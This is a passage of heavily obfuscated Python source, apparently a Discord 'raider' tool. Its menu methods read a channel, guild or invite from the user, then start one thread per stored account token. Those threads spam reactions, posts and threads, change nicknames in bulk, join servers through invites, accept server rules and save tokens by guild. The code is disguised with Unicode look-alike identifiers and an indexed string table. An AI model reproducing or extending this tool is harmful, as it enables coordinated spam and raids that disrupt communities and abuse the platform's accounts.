        𝗿𝘦𝘢𝗰𝙩𝗶𝙤𝗻 = 𝗶𝘯𝗽𝙪𝙩(f'{𝙧}{𝗜𝗡𝙄𝙉𝘭𝘭𝙄𝗠𝘐𝗜𝙡𝗠𝙡𝘭𝙄𝙡𝙡𝗡𝘕𝗜𝘭𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝗜𝙈𝙄𝗠[91]}{𝘭𝗰}{𝙄𝙉𝙄𝙉𝘭𝘭𝗜𝗠𝙄𝙄𝘭𝗠𝘭𝙡𝙄𝗹𝗹𝘕𝘕𝘐𝘭𝗹𝗠𝗡𝙡𝗡𝘭𝘔𝙄𝙈𝙄𝘔[371]}{𝘳}{𝘐𝙉𝘐𝗡𝗹𝙡𝗜𝗠𝘐𝙄𝗹𝙈𝘭𝗹𝘐𝙡𝗹𝘕𝘕𝘐𝘭𝗹𝗠𝘕𝙡𝙉𝗹𝙈𝘐𝗠𝘐𝗠[365]}')
        if 𝗿𝘦𝘢𝗰𝘵𝙞𝘰𝙣 == 𝗜𝙉𝙄𝙉𝘭𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝙉𝙉𝗜𝗹𝗹𝘔𝙉𝗹𝘕𝘭𝙈𝘐𝗠𝘐𝙈[22]:
            𝙈𝗲𝗻𝙪().main_menu()
        𝘰𝙨.system(𝘐𝙉𝙄𝙉𝘭𝙡𝘐𝗠𝙄𝗜𝗹𝘔𝗹𝘭𝙄𝘭𝘭𝗡𝗡𝙄𝘭𝙡𝘔𝗡𝙡𝘕𝗹𝗠𝗜𝙈𝙄𝙈[1])
        𝙥𝙧𝙞𝘯𝙩(𝗺𝙚𝙣𝘶)
        for 𝙩𝗼𝙠𝙚𝗻 in 𝙩𝙤𝗸𝙚𝙣𝘴:
            𝘵𝙝𝗿𝗲𝙖𝙙𝙞𝙣𝘨.Thread(target=𝙧𝗲𝘢𝗰𝘁𝗼𝗿, args=(𝙩𝙤𝙠𝙚𝙣, 𝙧𝘦𝘢𝗰𝘵𝘪𝙤𝙣, 𝙢𝘦𝙨𝘀𝗮𝙜𝙚_𝘭𝙞𝘯𝗸)).start()
        𝗲𝘅𝗶𝘵 = 𝙞𝘯𝙥𝘂𝙩(𝙄𝙉𝙄𝘕𝗹𝙡𝗜𝗠𝘐𝙄𝙡𝗠𝗹𝙡𝙄𝙡𝗹𝘕𝘕𝗜𝙡𝙡𝘔𝙉𝘭𝗡𝙡𝘔𝗜𝙈𝘐𝙈[22])
        𝗲𝘹𝙞𝘁 = 𝗠𝗲𝘯𝙪().main_menu()
        𝗲𝙭𝗶𝘁()

    @𝘸𝘳𝙖𝙥𝗽𝘦𝙧
    def forms(self):
        𝘰𝘴.system(𝙄𝗡𝙄𝙉𝙡𝘭𝙄𝙈𝗜𝙄𝗹𝘔𝗹𝙡𝙄𝘭𝗹𝘕𝙉𝙄𝗹𝙡𝗠𝙉𝗹𝙉𝘭𝙈𝙄𝙈𝙄𝗠[1])
        𝘱𝙧𝗶𝗻𝘵(𝗺𝘦𝙣𝘶)
        𝗼𝙨.system(𝘐𝙉𝗜𝘕𝗹𝘭𝗜𝘔𝘐𝗜𝘭𝘔𝙡𝘭𝗜𝗹𝗹𝗡𝗡𝘐𝗹𝘭𝗠𝗡𝗹𝗡𝘭𝘔𝘐𝗠𝗜𝘔[372])
        𝘤𝗵𝗮𝘯𝘯𝗲𝘭 = 𝙮𝗯𝘜𝗳𝗢𝗰𝙇39𝗗𝙪𝗢𝗻𝗳_𝘶𝘘𝙩𝙀𝘢𝙗𝗧𝘮𝗩𝗰𝘛𝘺𝗠𝙠08𝙬.mro()[8](𝘪𝘯𝙥𝙪𝙩(f'{𝗿}{𝙄𝘕𝘐𝗡𝙡𝗹𝘐𝙈𝙄𝙄𝗹𝘔𝗹𝘭𝗜𝙡𝙡𝘕𝙉𝘐𝗹𝗹𝙈𝘕𝙡𝙉𝗹𝙈𝗜𝘔𝙄𝗠[91]}{𝘭𝗰}{𝙄𝘕𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝗜𝘭𝗠𝘭𝗹𝗜𝘭𝗹𝗡𝙉𝗜𝙡𝗹𝘔𝗡𝙡𝗡𝘭𝗠𝘐𝘔𝙄𝙈[373]}{𝙧}{𝗜𝗡𝙄𝗡𝗹𝗹𝗜𝘔𝘐𝗜𝙡𝗠𝘭𝙡𝙄𝙡𝙡𝗡𝙉𝘐𝘭𝙡𝘔𝙉𝙡𝘕𝘭𝘔𝘐𝗠𝘐𝗠[365]}'))
        if 𝘤𝗵𝗮𝙣𝗻𝙚𝗹 == 𝗜𝘕𝘐𝗡𝘭𝗹𝘐𝙈𝙄𝗜𝘭𝗠𝙡𝗹𝗜𝙡𝘭𝙉𝗡𝘐𝘭𝘭𝗠𝘕𝘭𝙉𝘭𝘔𝗜𝙈𝗜𝘔[22]:
            𝙈𝘦𝘯𝙪().main_menu()
        𝗻𝗮𝙢𝘦 = 𝗶𝘯𝘱𝘂𝘁(f'{𝙧}{𝗜𝘕𝘐𝗡𝗹𝗹𝙄𝘔𝙄𝗜𝗹𝙈𝙡𝙡𝗜𝗹𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝙉𝗹𝗡𝙡𝗠𝘐𝙈𝙄𝗠[91]}{𝗹𝗰}{𝙄𝙉𝗜𝗡𝗹𝗹𝙄𝘔𝘐𝗜𝘭𝙈𝙡𝙡𝙄𝙡𝗹𝘕𝗡𝙄𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝗠𝘐𝗠𝘐𝙈[374]}{𝗿}{𝙄𝙉𝘐𝙉𝘭𝙡𝗜𝗠𝘐𝘐𝙡𝘔𝘭𝘭𝙄𝗹𝘭𝗡𝙉𝗜𝙡𝗹𝙈𝗡𝘭𝘕𝘭𝗠𝗜𝗠𝗜𝙈[365]}')
        if 𝘯𝘢𝗺𝗲 == 𝘐𝗡𝗜𝙉𝙡𝗹𝙄𝙈𝗜𝗜𝙡𝙈𝘭𝙡𝗜𝙡𝗹𝗡𝙉𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝘭𝘔𝗜𝘔𝗜𝗠[22]:
            𝘔𝘦𝗻𝘂().main_menu()
        𝘮𝙨𝘨 = 𝘪𝙣𝙥𝘂𝘵(f'{𝙧}{𝗜𝘕𝗜𝗡𝗹𝙡𝗜𝘔𝗜𝙄𝘭𝙈𝙡𝗹𝙄𝘭𝙡𝗡𝗡𝗜𝗹𝘭𝗠𝙉𝘭𝘕𝙡𝘔𝗜𝗠𝗜𝘔[91]}{𝗹𝙘}{𝗜𝗡𝗜𝙉𝘭𝗹𝙄𝗠𝗜𝙄𝙡𝘔𝙡𝗹𝘐𝙡𝘭𝘕𝗡𝘐𝘭𝘭𝙈𝗡𝘭𝘕𝗹𝙈𝗜𝗠𝘐𝙈[375]}{𝙧}{𝘐𝘕𝙄𝗡𝗹𝘭𝗜𝙈𝗜𝘐𝗹𝙈𝙡𝙡𝗜𝙡𝗹𝗡𝙉𝗜𝗹𝗹𝙈𝙉𝗹𝙉𝙡𝙈𝘐𝙈𝗜𝘔[365]}')
        if 𝘮𝘴𝘨 == 𝘐𝘕𝘐𝙉𝗹𝘭𝘐𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝘭𝗹𝙉𝗡𝘐𝙡𝘭𝘔𝗡𝙡𝘕𝙡𝙈𝙄𝗠𝙄𝗠[22]:
            𝘔𝗲𝙣𝙪().main_menu()
        𝘰𝘴.system(𝗜𝙉𝘐𝗡𝗹𝘭𝗜𝘔𝙄𝗜𝘭𝙈𝗹𝘭𝘐𝘭𝙡𝗡𝗡𝘐𝙡𝘭𝘔𝗡𝘭𝙉𝙡𝙈𝗜𝘔𝘐𝗠[1])
        𝘱𝙧𝗶𝙣𝘁(𝙢𝘦𝘯𝘂)
        for 𝙩𝘰𝙠𝘦𝙣 in 𝙩𝘰𝙠𝗲𝗻𝘀:
            𝙩𝘩𝙧𝗲𝗮𝙙𝙞𝘯𝗴.Thread(target=𝗽𝙤𝘴𝘁_𝘴𝗽𝘢𝘮𝙢𝘦𝗿, args=(𝙩𝙤𝘬𝙚𝘯, 𝗰𝙝𝘢𝘯𝘯𝙚𝗹, 𝗻𝙖𝙢𝙚, 𝗺𝙨𝗴)).start()
        𝙚𝙭𝗶𝙩 = 𝘪𝗻𝗽𝘂𝘁(𝘐𝙉𝙄𝘕𝙡𝗹𝙄𝗠𝘐𝘐𝗹𝙈𝙡𝙡𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝗹𝗠𝙉𝘭𝙉𝙡𝙈𝘐𝘔𝙄𝗠[22])
        𝙚𝘅𝙞𝘁 = 𝙈𝙚𝗻𝘂().main_menu()
        𝙚𝘅𝗶𝘁()

    @𝘸𝘳𝘢𝗽𝗽𝙚𝗿
    def thread(self):
        𝘰𝘀.system(𝘐𝙉𝘐𝗡𝘭𝙡𝗜𝗠𝙄𝗜𝗹𝘔𝗹𝘭𝙄𝗹𝗹𝙉𝗡𝘐𝗹𝘭𝙈𝘕𝙡𝗡𝗹𝙈𝙄𝙈𝙄𝗠[1])
        𝗽𝙧𝘪𝘯𝘵(𝘮𝗲𝘯𝙪)
        𝗼𝘀.system(𝙄𝗡𝘐𝙉𝘭𝘭𝙄𝘔𝗜𝗜𝗹𝙈𝙡𝙡𝙄𝘭𝗹𝘕𝘕𝗜𝘭𝘭𝙈𝘕𝘭𝗡𝗹𝘔𝙄𝙈𝙄𝘔[376])
        𝗻𝗮𝗺𝗲 = 𝗶𝗻𝘱𝘂𝘵(f'{𝗿}{𝘐𝗡𝗜𝘕𝙡𝗹𝙄𝙈𝙄𝘐𝗹𝗠𝗹𝘭𝘐𝘭𝙡𝙉𝘕𝗜𝗹𝙡𝘔𝘕𝗹𝗡𝙡𝗠𝘐𝙈𝘐𝗠[91]}{𝘭𝙘}{𝘐𝙉𝘐𝘕𝘭𝘭𝙄𝙈𝙄𝙄𝘭𝗠𝙡𝘭𝘐𝗹𝘭𝙉𝘕𝗜𝙡𝘭𝘔𝘕𝙡𝗡𝙡𝘔𝙄𝘔𝗜𝘔[377]}{𝗿}{𝙄𝗡𝘐𝗡𝙡𝗹𝗜𝙈𝗜𝗜𝗹𝗠𝙡𝙡𝘐𝘭𝙡𝗡𝗡𝗜𝘭𝘭𝙈𝙉𝙡𝗡𝘭𝗠𝙄𝗠𝘐𝙈[365]}')
        if 𝘯𝙖𝗺𝗲 == 𝘐𝙉𝗜𝘕𝘭𝘭𝗜𝙈𝙄𝗜𝘭𝘔𝘭𝙡𝗜𝙡𝙡𝗡𝗡𝙄𝗹𝘭𝙈𝙉𝙡𝙉𝙡𝙈𝙄𝘔𝘐𝗠[22]:
            𝙈𝘦𝗻𝙪().main_menu()
        𝘤𝗵𝘢𝘯𝗻𝘦𝙡 = 𝘉𝘋0𝘩8𝙍01𝗨3𝙐𝘇𝘨9𝘚_𝙯𝘽𝗝𝘈𝘁𝙞𝘸𝗨0𝘡𝘼𝗴2𝙪𝙨𝘋.mro()[10](𝗶𝘯𝘱𝘂𝙩(f'{𝘳}{𝘐𝙉𝙄𝘕𝗹𝙡𝘐𝘔𝘐𝗜𝗹𝘔𝘭𝘭𝗜𝙡𝘭𝗡𝗡𝗜𝙡𝘭𝘔𝙉𝙡𝙉𝙡𝘔𝘐𝙈𝘐𝗠[91]}{𝗹𝘤}{𝘐𝗡𝘐𝗡𝙡𝗹𝘐𝗠𝗜𝘐𝗹𝘔𝘭𝗹𝙄𝘭𝗹𝙉𝙉𝙄𝙡𝙡𝗠𝗡𝘭𝗡𝗹𝗠𝙄𝘔𝘐𝘔[373]}{𝘳}{𝙄𝙉𝗜𝗡𝗹𝘭𝘐𝗠𝙄𝙄𝗹𝙈𝙡𝗹𝙄𝗹𝘭𝙉𝙉𝙄𝘭𝗹𝘔𝙉𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝗠[365]}'))
        if 𝙘𝙝𝙖𝗻𝙣𝙚𝗹 == 𝘐𝙉𝙄𝗡𝙡𝙡𝘐𝗠𝗜𝙄𝙡𝗠𝗹𝙡𝗜𝘭𝘭𝙉𝙉𝘐𝗹𝗹𝘔𝗡𝘭𝗡𝗹𝗠𝗜𝗠𝘐𝘔[22]:
            𝘔𝘦𝗻𝙪().main_menu()
        𝗼𝘀.system(𝗜𝗡𝘐𝙉𝙡𝗹𝗜𝗠𝗜𝘐𝗹𝗠𝗹𝘭𝙄𝘭𝗹𝘕𝗡𝙄𝙡𝙡𝙈𝘕𝘭𝙉𝙡𝘔𝘐𝘔𝙄𝙈[1])
        𝘱𝗿𝙞𝘯𝙩(𝗺𝙚𝙣𝘶)
        for 𝘁𝗼𝘬𝗲𝙣 in 𝙩𝘰𝙠𝗲𝘯𝘀:
            𝘵𝗵𝗿𝙚𝙖𝘥𝗶𝘯𝘨.Thread(target=𝘵𝗵𝘳𝘦𝗮𝗱_𝘀𝙥𝘢𝙢𝘮𝙚𝙧, args=(𝘵𝙤𝗸𝘦𝘯, 𝗻𝘢𝙢𝘦, 𝙘𝗵𝙖𝙣𝙣𝘦𝘭)).start()
        𝙚𝘹𝗶𝘁 = 𝗶𝗻𝙥𝘂𝙩(𝘐𝘕𝗜𝙉𝘭𝙡𝗜𝙈𝗜𝗜𝘭𝘔𝘭𝙡𝗜𝗹𝘭𝗡𝙉𝘐𝗹𝙡𝗠𝙉𝘭𝘕𝗹𝙈𝗜𝘔𝗜𝗠[22])
        𝗲𝘅𝘪𝙩 = 𝙈𝘦𝗻𝘂().main_menu()
        𝘦𝘹𝙞𝘵()

    @𝘸𝗿𝙖𝘱𝗽𝘦𝘳
    def Nick(self):
        𝗼𝘴.system(𝘐𝘕𝗜𝘕𝘭𝘭𝘐𝙈𝘐𝘐𝘭𝙈𝘭𝙡𝘐𝗹𝘭𝙉𝙉𝙄𝙡𝘭𝙈𝙉𝗹𝙉𝙡𝘔𝙄𝘔𝘐𝙈[378])
        𝘰𝙨.system(𝘐𝘕𝗜𝘕𝗹𝙡𝘐𝘔𝙄𝗜𝙡𝗠𝙡𝗹𝙄𝙡𝙡𝘕𝗡𝙄𝙡𝗹𝗠𝘕𝗹𝘕𝗹𝗠𝗜𝙈𝙄𝗠[1])
        𝘱𝗿𝗶𝙣𝘵(𝘮𝘦𝘯𝙪)
        𝗴𝘂𝙞𝘭𝘥 = 𝙬37𝙙6𝙢66𝘸𝗤𝘮_𝗤𝙛𝙎𝘽𝘜𝘕𝙪_𝙇1𝙁𝙖𝘻𝗕𝗖𝘂𝘑𝗵𝗡𝗙.mro()[7](𝘪𝗻𝘱𝙪𝘵(f'{𝙧}{𝘐𝘕𝗜𝗡𝗹𝗹𝙄𝘔𝘐𝙄𝘭𝘔𝘭𝘭𝗜𝘭𝘭𝘕𝙉𝗜𝗹𝘭𝙈𝙉𝗹𝗡𝙡𝙈𝗜𝗠𝗜𝗠[91]}{𝗹𝙘}{𝗜𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝙄𝘐𝘭𝗠𝙡𝗹𝘐𝙡𝙡𝘕𝘕𝘐𝘭𝙡𝗠𝘕𝗹𝗡𝗹𝗠𝙄𝘔𝘐𝗠[379]}{𝘳}{𝗜𝘕𝙄𝙉𝙡𝗹𝘐𝘔𝘐𝗜𝙡𝙈𝙡𝗹𝘐𝙡𝗹𝙉𝙉𝘐𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝘔𝘐𝘔𝘐𝙈[365]}'))
        if 𝙜𝘂𝘪𝙡𝗱 == 𝙄𝘕𝙄𝙉𝗹𝗹𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝘭𝘐𝗹𝗹𝗡𝘕𝙄𝗹𝘭𝙈𝘕𝗹𝘕𝗹𝗠𝘐𝘔𝗜𝘔[22]:
            𝙈𝘦𝘯𝙪().main_menu()
        𝗻𝙞𝗰𝘬 = 𝗶𝘯𝘱𝘂𝙩(f'{𝘳}{𝘐𝗡𝙄𝘕𝗹𝘭𝗜𝘔𝗜𝗜𝙡𝘔𝗹𝙡𝘐𝘭𝘭𝘕𝙉𝙄𝘭𝘭𝘔𝙉𝗹𝘕𝙡𝗠𝗜𝙈𝙄𝙈[91]}{𝙡𝗰}{𝙄𝗡𝙄𝘕𝙡𝙡𝙄𝗠𝗜𝙄𝘭𝘔𝗹𝗹𝗜𝘭𝗹𝘕𝘕𝙄𝗹𝗹𝙈𝗡𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝗠[380]}{𝘳}{𝘐𝙉𝙄𝗡𝗹𝙡𝗜𝘔𝙄𝙄𝙡𝗠𝘭𝘭𝙄𝘭𝘭𝙉𝗡𝗜𝗹𝙡𝗠𝘕𝗹𝗡𝙡𝘔𝘐𝙈𝙄𝘔[365]}')
        if 𝘯𝙞𝗰𝘬 == 𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝙄𝗜𝗹𝘔𝙡𝙡𝗜𝙡𝗹𝙉𝘕𝙄𝙡𝗹𝘔𝙉𝙡𝗡𝘭𝘔𝙄𝗠𝗜𝗠[22]:
            𝙈𝙚𝙣𝙪().main_menu()
        𝗼𝘀.system(𝘐𝗡𝗜𝙉𝙡𝙡𝘐𝘔𝗜𝘐𝘭𝗠𝙡𝘭𝘐𝙡𝗹𝙉𝙉𝙄𝗹𝙡𝙈𝙉𝙡𝗡𝙡𝗠𝘐𝗠𝘐𝙈[1])
        𝗽𝙧𝗶𝙣𝘵(𝙢𝘦𝙣𝘶)
        for 𝙩𝘰𝘬𝘦𝙣 in 𝙩𝘰𝘬𝘦𝘯𝘴:
            𝙩𝘩𝗿𝙚𝙖𝘥𝗶𝘯𝘨.Thread(target=𝙢𝙖𝘴𝘀_𝗻𝙞𝙘𝙠, args=(𝘁𝙤𝗸𝙚𝗻, 𝙜𝙪𝙞𝙡𝙙, 𝘯𝙞𝙘𝘬)).start()
        𝗲𝙭𝙞𝘁 = 𝗶𝘯𝙥𝘂𝘁(𝘐𝗡𝘐𝗡𝙡𝙡𝘐𝙈𝗜𝗜𝗹𝘔𝗹𝘭𝗜𝘭𝙡𝘕𝘕𝙄𝘭𝙡𝙈𝘕𝗹𝗡𝗹𝙈𝗜𝗠𝙄𝗠[22])
        𝙚𝘅𝗶𝘁 = 𝙈𝗲𝘯𝙪().main_menu()
        𝗲𝙭𝙞𝘵()

    @𝘸𝘳𝘢𝘱𝙥𝗲𝘳
    def Check_guild(self):
        𝘰𝘀.system(𝘐𝙉𝗜𝗡𝘭𝗹𝘐𝘔𝙄𝘐𝙡𝘔𝘭𝘭𝙄𝙡𝙡𝗡𝗡𝙄𝙡𝘭𝘔𝘕𝗹𝗡𝙡𝙈𝘐𝗠𝗜𝙈[381])
        𝗼𝘴.system(𝘐𝙉𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝙡𝙡𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝘔𝗡𝙡𝘕𝙡𝘔𝙄𝗠𝘐𝗠[1])
        𝙥𝙧𝙞𝗻𝘁(𝙢𝘦𝙣𝙪)
        𝙜𝘂𝗶𝙡𝙙𝙞𝙙 = 𝙞𝗻𝙥𝘂𝘁(f'{𝗿}{𝘐𝘕𝗜𝙉𝙡𝙡𝗜𝗠𝙄𝘐𝗹𝗠𝙡𝙡𝗜𝙡𝘭𝘕𝘕𝘐𝗹𝘭𝘔𝙉𝙡𝙉𝘭𝙈𝗜𝗠𝘐𝗠[91]}{𝗹𝗰}{𝙄𝘕𝗜𝘕𝗹𝘭𝙄𝙈𝙄𝘐𝘭𝗠𝘭𝘭𝙄𝘭𝙡𝗡𝘕𝙄𝘭𝘭𝙈𝘕𝗹𝗡𝙡𝗠𝙄𝘔𝙄𝘔[379]}{𝘳}{𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝙈𝗜𝙄𝘭𝗠𝘭𝘭𝘐𝘭𝘭𝘕𝘕𝙄𝙡𝙡𝘔𝘕𝘭𝘕𝗹𝙈𝗜𝙈𝘐𝘔[365]}')
        if 𝙜𝙪𝗶𝙡𝘥𝙞𝙙 == 𝘐𝗡𝘐𝘕𝗹𝙡𝙄𝗠𝙄𝗜𝘭𝙈𝗹𝗹𝘐𝘭𝘭𝙉𝘕𝙄𝘭𝗹𝗠𝘕𝗹𝗡𝙡𝙈𝗜𝘔𝘐𝘔[22]:
            𝙈𝙚𝙣𝙪().main_menu()
        𝗼𝙨.system(𝙄𝗡𝙄𝗡𝘭𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝗹𝗹𝘐𝙡𝘭𝗡𝙉𝙄𝘭𝙡𝗠𝘕𝙡𝗡𝘭𝗠𝘐𝙈𝘐𝘔[1])
        𝙥𝗿𝘪𝘯𝘁(𝙢𝙚𝗻𝙪)
        𝘀𝗮𝘷𝗲_𝘁𝘰𝘬𝙚𝙣𝘀_𝙜𝙪𝗶𝗹𝗱(𝗜𝗡𝘐𝘕𝘭𝘭𝗜𝙈𝙄𝘐𝘭𝘔𝙡𝘭𝙄𝗹𝘭𝗡𝘕𝘐𝙡𝙡𝘔𝗡𝘭𝘕𝙡𝙈𝙄𝗠𝗜𝘔[59], 𝗴𝘂𝗶𝘭𝙙𝗶𝘥)
        𝗲𝘹𝗶𝘵 = 𝘪𝘯𝘱𝙪𝘵(𝗜𝘕𝘐𝘕𝗹𝙡𝙄𝘔𝙄𝙄𝙡𝗠𝙡𝗹𝘐𝘭𝙡𝘕𝘕𝗜𝗹𝙡𝗠𝙉𝘭𝗡𝗹𝙈𝙄𝘔𝙄𝘔[22])
        𝙚𝙭𝘪𝘵 = 𝘔𝙚𝙣𝘶().main_menu()
        𝗲𝘅𝙞𝙩()

    @𝘸𝙧𝙖𝘱𝗽𝗲𝙧
    def joiner(self):
        𝙤𝙨.system(𝙄𝙉𝙄𝘕𝙡𝗹𝙄𝘔𝙄𝙄𝘭𝗠𝘭𝗹𝙄𝘭𝙡𝘕𝗡𝗜𝗹𝗹𝙈𝗡𝙡𝘕𝙡𝗠𝘐𝘔𝙄𝙈[140])
        𝘰𝘀.system(𝙄𝘕𝙄𝗡𝙡𝙡𝙄𝘔𝙄𝘐𝙡𝗠𝘭𝙡𝘐𝗹𝗹𝗡𝗡𝙄𝘭𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝙄𝙈𝗜𝘔[1])
        𝘱𝘳𝙞𝗻𝙩(𝗺𝙚𝙣𝘶)
        𝗶𝗻𝘃𝘪𝙩𝘦 = 𝙞𝗻𝙥𝘶𝘵(f'{𝗿}{𝗜𝘕𝙄𝙉𝙡𝙡𝙄𝙈𝘐𝙄𝘭𝙈𝘭𝙡𝘐𝗹𝗹𝙉𝗡𝘐𝙡𝙡𝙈𝗡𝘭𝘕𝘭𝗠𝗜𝗠𝙄𝙈[91]}{𝗹𝗰}{𝗜𝘕𝙄𝙉𝘭𝘭𝗜𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝙄𝗹𝗹𝗡𝙉𝙄𝙡𝘭𝙈𝗡𝗹𝙉𝗹𝙈𝙄𝙈𝘐𝗠[382]}{𝗿}{𝗜𝗡𝗜𝗡𝘭𝙡𝘐𝘔𝘐𝙄𝙡𝘔𝙡𝘭𝗜𝗹𝙡𝘕𝙉𝘐𝗹𝙡𝘔𝙉𝘭𝙉𝗹𝘔𝘐𝙈𝙄𝗠[93]}')
        if 𝗶𝗻𝘷𝗶𝘵𝗲 == 𝘐𝙉𝘐𝗡𝙡𝘭𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝘭𝘐𝘭𝙡𝙉𝗡𝘐𝘭𝘭𝙈𝗡𝘭𝘕𝙡𝗠𝙄𝙈𝘐𝙈[22]:
            𝘔𝙚𝘯𝙪().main_menu()
        𝗱𝗲𝙡𝗮𝘺 = 𝗙8𝘀𝘷𝗸𝘘𝗥24𝙎3𝗻𝙦𝗛6𝗥𝙓𝗝𝘛𝗪𝘷𝗨7𝙎𝙪47𝘖𝘐𝘫𝘂𝗻.mro()[8](𝙞𝗻𝙥𝙪𝘵(f'{𝘳}{𝗜𝘕𝗜𝙉𝗹𝙡𝘐𝘔𝙄𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝙡𝙉𝘕𝗜𝘭𝙡𝗠𝙉𝗹𝗡𝘭𝘔𝙄𝗠𝗜𝗠[91]}{𝙡𝘤}{𝙄𝗡𝙄𝗡𝙡𝗹𝙄𝙈𝗜𝗜𝗹𝗠𝙡𝙡𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝙡𝘔𝗡𝘭𝘕𝗹𝙈𝙄𝘔𝗜𝗠[383]}{𝘳}{𝘐𝗡𝗜𝗡𝗹𝘭𝗜𝗠𝗜𝗜𝘭𝙈𝙡𝘭𝘐𝘭𝙡𝙉𝗡𝘐𝙡𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝙄𝙈[365]}'))
        if 𝘥𝘦𝙡𝗮𝘆 == 𝗜𝗡𝘐𝗡𝙡𝘭𝘐𝙈𝘐𝗜𝙡𝙈𝙡𝙡𝘐𝘭𝗹𝙉𝙉𝙄𝙡𝙡𝘔𝙉𝘭𝙉𝗹𝙈𝘐𝗠𝙄𝙈[22]:
            𝘔𝙚𝙣𝙪().main_menu()
        if 𝗶𝘯𝘃𝗶𝙩𝗲.startswith(𝙄𝙉𝙄𝘕𝘭𝘭𝗜𝘔𝘐𝗜𝙡𝙈𝙡𝘭𝙄𝙡𝗹𝗡𝙉𝘐𝗹𝗹𝗠𝗡𝗹𝗡𝗹𝙈𝘐𝙈𝗜𝘔[384]):
            𝙞𝙣𝙫𝙞𝘵𝗲_𝗻𝗮𝗺𝗲 = 𝗶𝘯𝘷𝗶𝘵𝙚.replace(𝘐𝗡𝘐𝙉𝙡𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝘭𝗜𝘭𝘭𝙉𝘕𝙄𝙡𝘭𝙈𝗡𝙡𝗡𝘭𝘔𝘐𝙈𝙄𝗠[384], 𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝘔𝘐𝗜𝙡𝗠𝙡𝘭𝙄𝘭𝘭𝘕𝙉𝗜𝗹𝗹𝗠𝘕𝙡𝙉𝙡𝙈𝗜𝗠𝙄𝗠[22]).split(𝘐𝗡𝗜𝗡𝙡𝙡𝗜𝘔𝘐𝘐𝘭𝗠𝘭𝘭𝘐𝗹𝙡𝗡𝙉𝙄𝙡𝘭𝗠𝘕𝙡𝙉𝗹𝗠𝙄𝙈𝘐𝗠[315])[-1]
        else:
            𝙞𝙣𝘷𝗶𝙩𝙚_𝘯𝘢𝙢𝙚 = 𝙞𝘯𝘷𝙞𝙩𝘦.split(𝗜𝘕𝙄𝘕𝙡𝘭𝘐𝘔𝘐𝙄𝗹𝙈𝘭𝙡𝙄𝘭𝘭𝙉𝙉𝗜𝗹𝘭𝘔𝙉𝘭𝗡𝘭𝘔𝗜𝙈𝙄𝘔[315])[-1]
        𝙖𝘳𝗴𝘀 = [(𝘁𝗼𝙠𝗲𝘯, 𝗶𝘯𝘷𝗶𝘁𝗲_𝗻𝙖𝘮𝙚) for 𝘁𝙤𝗸𝗲𝗻 in 𝘵𝘰𝘬𝘦𝙣𝘀]
        𝘀𝘭𝙚𝗲𝘱(𝗱𝙚𝘭𝘢𝙮)
        𝙨𝘦𝙡𝘧.run(𝘴𝙚𝗹𝗳.raider.joiner, 𝙖𝙧𝘨𝘀)

    @𝘸𝙧𝗮𝘱𝘱𝘦𝗿
    def accept_rules(self):
        𝗼𝘀.system(𝘐𝙉𝘐𝘕𝗹𝙡𝗜𝘔𝙄𝙄𝗹𝘔𝗹𝙡𝙄𝙡𝗹𝗡𝗡𝘐𝗹𝘭𝙈𝙉𝘭𝙉𝙡𝘔𝗜𝗠𝗜𝘔[385])
        𝗼𝙨.system(𝗜𝙉𝘐𝘕𝘭𝙡𝙄𝙈𝗜𝙄𝘭𝗠𝘭𝙡𝘐𝗹𝙡𝘕𝘕𝗜𝗹𝘭𝗠𝘕𝘭𝘕𝙡𝙈𝗜𝗠𝙄𝗠[1])
        𝙥𝘳𝗶𝗻𝘵(𝘮𝗲𝘯𝙪)
        𝘀𝘦𝗿𝘷𝗲𝙧_𝙞𝙙 = 𝙞𝙣𝗽𝘂𝘵(𝗜𝘕𝘐𝗡𝗹𝗹𝗜𝙈𝙄𝘐𝗹𝗠𝗹𝙡𝘐𝗹𝗹𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝗹𝘕𝙡𝙈𝘐𝘔𝘐𝙈[386])
        if 𝘴𝙚𝘳𝘷𝗲𝘳_𝘪𝙙 == 𝙄𝘕𝙄𝙉𝘭𝗹𝘐𝗠𝗜𝗜𝘭𝙈𝗹𝙡𝘐𝘭𝙡𝙉𝘕𝗜𝗹𝗹𝘔𝘕𝙡𝙉𝘭𝘔𝗜𝙈𝘐𝘔[22]:
            𝙈𝗲𝗻𝘶().main_menu()
        𝘰𝘀.system(𝗜𝗡𝙄𝘕𝗹𝘭𝙄𝙈𝘐𝙄𝙡𝙈𝙡𝘭𝗜𝘭𝙡𝙉𝗡𝙄𝙡𝗹𝘔𝗡𝗹𝙉𝙡𝙈𝘐𝙈𝘐𝙈[1])
        𝙥𝗿𝘪𝘯𝘁(𝗺𝗲𝙣𝙪)
        for 𝙩𝘰𝙠𝗲𝙣 in 𝙩𝙤𝗸𝗲𝘯𝘴:
            𝘁𝗵𝙧𝘦𝗮𝙙𝘪𝘯𝙜.Thread(target=𝘢𝘤𝙘𝘦𝗽𝘵_𝙧𝘶𝗹𝘦𝘀𝘀, args=(𝘀𝗲𝘳𝙫𝙚𝗿_𝙞𝘥, 𝘵𝘰𝙠𝗲𝗻)).start()
